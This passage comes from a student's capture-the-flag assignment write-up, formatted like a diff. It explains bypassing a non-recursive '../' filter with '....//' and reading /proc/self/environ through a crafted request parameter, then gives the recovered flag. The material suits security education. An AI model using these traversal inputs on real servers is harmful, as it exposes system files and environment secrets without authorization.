+Usually we can try dumping `/proc/self/environ` but the server prepends `assets` to the part. The server also removes `../` but it does not do it recursively. A cheeky little `....//assets/image.png` manages to come out of the assets folder, and successfully returns the cat pic. We can start with `/proc/self/environ` and work forward by prepending as many `....//` until we managed to back out to root and then into the proper folder.
+
+I try `username=@service:8000/?file=/proc/self/environ`. I see that instead of an error, I get a string. I throw it into CyberChef and...
+
+![tip_of_iceberg](@assets/cs2107-assignment-02/H.2/10.png)
+
+Key: `CS2107{this-is-just-the-tip-of-the-iceberg!}`
+
+# Final thoughts
+
+This was amazing. It is so much harder but actually when I explain the steps out in the writeup, suddenly the things become clear. I guess that's why planning is key! Glad to smash the stack so many times too!
